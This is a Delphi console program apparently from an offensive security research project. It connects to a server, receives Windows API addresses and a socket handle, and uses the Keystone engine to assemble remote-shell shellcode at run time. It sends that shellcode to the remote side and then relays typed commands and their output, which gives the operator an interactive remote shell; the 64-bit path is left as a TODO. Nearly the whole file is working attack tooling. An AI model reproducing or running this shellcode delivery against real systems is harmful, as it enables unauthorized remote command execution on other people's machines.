{******************************************************************************}
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{******************************************************************************}


        (*MMMMMMMMMMMMMMMMNKkdl:;,,,,'',,,,;cok0NWMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMWXOdlc:;;::::::::::::;;;;:ldOXWMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMNOo:;:cllllooooooollllllccc::;;cd0WMMMMMMMMMMMMMMMMM
        MMMMMMMMMMNOl::looooooooooooooooooooooollc::;:dKWMMMMMMMMMMMMMMM
        MMMMMMMMMXd:cooooooooooooooodddddddddooooolc::;cOWMMMMMMMMMMMMMM
        MMMMMMMMKo:looooooooooooooodxkkkkkkkxxddoooolc:;:OWMMMMMMMMMMMMM
        MMMMMMMXo:loooooooooooooddodxxkkkkkkkkxxdoooooc:;c0MMMMMMMMMMMMM
        MMMMMMWx:looooooooooooodxxdoddxkkkkkkkkxdooooooc:,oNMMMMMMMMMMMM
        MMMMMMXl:ooooooooooooooodddooodddddxxxddoooooooc:;:0MMMMMMMMMMMM
        MMMMMMO::ooooooooooooooooooooooooooooooooooooooc:;;xWMMMMMMMMMMM
        MMMMMWx;:loooooooooooooooooooooooooooooooooooolc::,dNMMMMMMMMMMM
        MMMMMWx;:looooooooooooooooooooooooooooooooooolc:::,oNMMMMMMMMMMM
        MMMMMWx;:loooooooooooooooooooooooooooooooooolc::::,dNMMMMMMMMMMM
        MMMMMMO;;cloooooooooooooooooooooooooooooooolc::::;;xWMMMMMMMMMMM
        MMMMMMKc,:cooooooooooooooooooooooooooooooolc:::::;:0MMMMMMMMMMMM
        MMMMMMWk;;:clooooooooooooooooooooooooooolc:::::::,oNMMMMMMMMMMMM
        MMMMMMMNd;::clloooooooooooooooooooooooolc:::::::;,cdxOKWMMMMMMMM
        MMMMMMMMXo,;::cclloooooooooooooooooolcc::::::;;;';cllccokXWMMMMM
        MMMMMMN0dl:,,:::::ccclllllllllllllcc:::::;;;;:ccccccldxoclONMMMM
        MMMMNOlcccc:;;;;::ccccccc::::::::::ccc:;,;codxxxxddoc:lxxl:kWMMM
        MMMNd;;:ccldddoc:;;;::::::::::;;;;;;;;;;codxoodxdlcloc;cddcc0MMM
        MMNd,,;codddxxxxdoc;,',,;:::cc:,,,',;:::coo::lol:,,coo:;clc;xWMM
        MWk;',cllloodddoddolc;,;::::cc:;;,':l;',ll;,cc;:cc:::cc;,::,lXMM
        MXl,,;c,,,;;:cll:cl::c:,;::::::::;,::''cc,.;:,:dxxxdc;:c;,:;cKMM
        MO:',:;,clcc:;;cc;:oc;:;,;::::;:::;,,',c;'';;;oxkkkkxc;cl:,,:0MM
        Wk;';;;lxxxxxo:;lc,:oc,'',,;;::::::;;'',,;:,,cdxkkxxdl;:ooc';0MM
        Wk,';;;odddxxxo:;;;;::,'';;,,,,,,,,,'''',;:ccoddddddol;:oool:lkN
        Wx;;:;:ooooooooolclollc:,,::::::::;,;;,;:;,;;cooooollo:;looool:l
        x:co:,:oooooooooooooddoc;,,::::::;,:c;',,,:;,:ooool:co:,coooool;
        :col;';lol:clloooooodddl:;';:::,,;colc;;;;,,:ooooo:,co:,;oooooc:
        ;llc,';:cc:,;:ccloooodxdl:;,,;,;codolc:::;':oooooc,':c:,,lool:lO
        ;cc:,';::::;,,;::clooodxdoc;,';oddooc:::;,,looooc,',;::;,:ccokXM
        x:;;,',::::::;,,,;:looooddol::looolc;;;,,;cooll:,'';:::;;oOKNMMM
        WOl,'',:::::::;,,',;:cloooooooooolc;,'',;:ccc:;'',;::::;c0MMMMMM
        MMN0xc,;:::;,,,;,,,'',;cloddoooool:,',;:::::;,',;:ccc::,lXMMMMMM
        MMMMM0:;:;,'''';;;;,,''';lddoooolc,';::::;;,,,;clooolc:,dWMMMMMM
        MMMMMNo,:;','''';clc::;,,;loooolc:'';;,,,,,;:clooooolc;:OMMMMMMM
        MMMMMMKc;:;;,,',,;:loooo:,:ooolc:;''''',;:ccloooooooc:,oXMMMMMMM
        MMMMMMWKl;::cc;,,'',:loooc;;:::,,''''';:cclooooooool:;:OWMMMMMMM
        MMMMMMMMXx:;coollc:;,,;coooc:;;;;;;'.';:looooooooolc;:OWMMMMMMMM
        MMMMMMMMMW0o::looooolc;,;:looooollc,.';:loooooollc;;oKWMMMMMMMMM
        MMMMMMMMMMMW0dc::loooool:,,:clllll:',;:::cccccc:;;lONMMMMMMMMMMM
        MMMMMMMMMMMMMWXko:;:llolc:;;,,;;;,,;:::::::::;;cdONMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMWKko:;:::;;;;;;;;;;;;;;::;;cox0XWMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMWKd;;:;;;,,,,,,;;;;::;cONWMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMWk;;::::::::::::::;;kWMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMMXl,::::::::::::::;oXMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMMXl,:::::::::::::;cKMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMWk;;::::::::::::;c0WMMMMMMMMMMMMMMMMMMMMMMM
        MXxx0XWMMMMMMMMMMMMMNx:;::::::::::::;lKWMMMMMMMMMMMMMMMMMMMMMMMM
        MKc,;cldkOKXNNNNXKOdc;;::::::::::;;cxNMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMXx:;;;;;::cccc::;;:::::::::;;;:lxXWMMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMWXOdl:;;;;:::::::::::;;;;;,,:oxKXWMMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMNKOkddolcccccccloodk0K0d:;;cxKWMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMWNXXKKKKXNWMMMMMMW0kk0NWMMMMMMMMMMMMMMMMMMMMMMMMM*)

program Controller;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  System.Classes,
  Winapi.Windows,
  Winapi.Winsock2,
  uKeystoneEngine in 'Units\uKeystoneEngine.pas',
  uFunctions in 'Units\uFunctions.pas',
  uSharedTypes in '..\Shared\uSharedTypes.pas',
  uSharedFunctions in '..\Shared\uSharedFunctions.pas',
  uFuncInTemplates in 'Units\uFuncInTemplates.pas',
  uSharedExceptions in '..\Shared\uSharedExceptions.pas';

{ Configuration }
const SERVER_PORT = 2801;
      SERVER_ADDR = '127.0.0.1';

type
  PSocket = ^TSocket;

  function OpenThread(
    dwDesiredAccess: DWORD;
    bInheritHandle: Boolean;
    dwThreadId: DWORD
  ): THandle; stdcall; external 'kernel32.dll';

{ Stdout Thread }
function StdoutThread(pParam : PVOID) : DWORD; stdcall;
var AClient : TSocket;
    AChar   : char;
begin
  try
    AClient := PSocket(pParam)^;
    ///

    while True do begin
      if recv(AClient, AChar, 1, 0) <= 0 then
        break;

      ///
      Write(AChar);
    end;
  finally
    ExitThread(0);
  end;
end;

{ Wait for thread to exit }
procedure WaitForThread(const AThreadId : DWORD);
var AThreadHandle : THandle;
begin
  AThreadHandle := OpenThread(SYNCHRONIZE, False, AThreadId);
  if AThreadHandle <> 0 then begin
    WaitForSingleObject(AThreadHandle, INFINITE);

    ///
    CloseHandle(AThreadHandle);
  end;
end;

{ Entrypoint }
var AWSAData               : TWSAData;
    AClient                : TSocket;
    ASockAddrIn            : TSockAddrIn;
    AHostEnt               : PHostEnt;
    ABuffer                : AnsiChar;
    AStdOutThreadId        : DWORD;
    ACommand               : AnsiString;
    ADoExit                : Boolean;
    AFuncInRemoteShellInfo : TFuncIn__RemoteShell__Information;
    AShellcode             : TMemoryStream;

begin
  IsMultiThread := True;
  AClient := INVALID_SOCKET;
  AStdOutThreadId := 0;
  try
    WSAStartup(MakeWord(2, 2), AWSAData);
    try
      { Create and configure new TCPv4 Socket }
      AClient := socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      if AClient = INVALID_SOCKET then
        raise ESocketException.Create('socket');

      ZeroMemory(@ASockAddrIn, SizeOf(TSockAddrIn));

      ASockAddrIn.sin_port        := htons(SERVER_PORT);
      ASockAddrIn.sin_family      := AF_INET;
      ASockAddrIn.sin_addr.S_addr := inet_addr(PAnsiChar(AnsiString(SERVER_ADDR)));

      if ASockAddrIn.sin_addr.S_addr = INADDR_NONE then begin
        AHostEnt := GetHostByName(PAnsiChar(AnsiString(SERVER_ADDR)));
        if AHostEnt <> nil then
          ASockAddrIn.sin_addr.S_addr := Integer(Pointer(AHostEnt^.h_addr^)^);
      end;

      { Connect to remote server }
      if connect(AClient, TSockAddr(ASockAddrIn), SizeOf(TSockAddrIn)) = SOCKET_ERROR then
        raise ESocketException.Create('connect');

      { Receive Func-In Information for JIT Shellcode Compilation }
      recv(AClient, AFuncInRemoteShellInfo, SizeOf(TFuncIn__RemoteShell__Information), 0);

      { Compile & Send Shellcode }
      case AFuncInRemoteShellInfo.Header.Architecture of
        x86_32 : begin
          KeystoneAssemble(
            Format(__FUNCIN_x32__REMOTE_SHELL, [
              AFuncInRemoteShellInfo.SocketFd,
              AFuncInRemoteShellInfo.__CreateProcessA,
              AFuncInRemoteShellInfo.__WaitForSingleObject,
              AFuncInRemoteShellInfo.__ExitThread
            ]),
            AShellcode
          );
        end;

        x86_64 : begin
          KeystoneAssemble(
            __FUNCIN_x64__REMOTE_SHELL, // TODO
            AShellcode
          );
        end;

        else
          raise Exception.Create('Unsupported Architecture');
      end;

      if not Assigned(AShellcode) then
        Exit();

      try
        { Send Shellcode Size }
        if SendInt64(AClient, AShellcode.Size) <= 0 then
          raise ESocketException.Create('SendInt64');

        { Send Shellcode }
        if Send(AClient, PByte(AShellcode.Memory)^, AShellcode.Size, 0) <= 0 then
          raise ESocketException.Create('send');
      finally
        if Assigned(AShellcode) then
          FreeAndNil(AShellcode);
      end;

      { Start Stdout Thread }
      if CreateThread(nil, 0, @StdoutThread, @AClient, 0, AStdOutThreadId) = 0 then
        raise EWindowsException.Create('CreateThread');

      { Process Stdin }
      ADoExit := False;
      while True do begin
        Readln(ACommand);
        if LowerCase(Trim(ACommand)) = 'exit' then
          ADoExit := True;
        ///

        ACommand := ACommand + #13#10;

        send(AClient, ACommand[1], Length(ACommand) * SizeOf(AnsiChar), 0);

        if ADoExit then
          break;
      end;
    finally
      if AClient <> INVALID_SOCKET then begin
        Shutdown(AClient, SD_BOTH);
        CloseSocket(AClient);
      end;

      if AStdOutThreadId > 0 then
        WaitForThread(AStdOutThreadId);

      ///
      WSACleanup();
    end;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
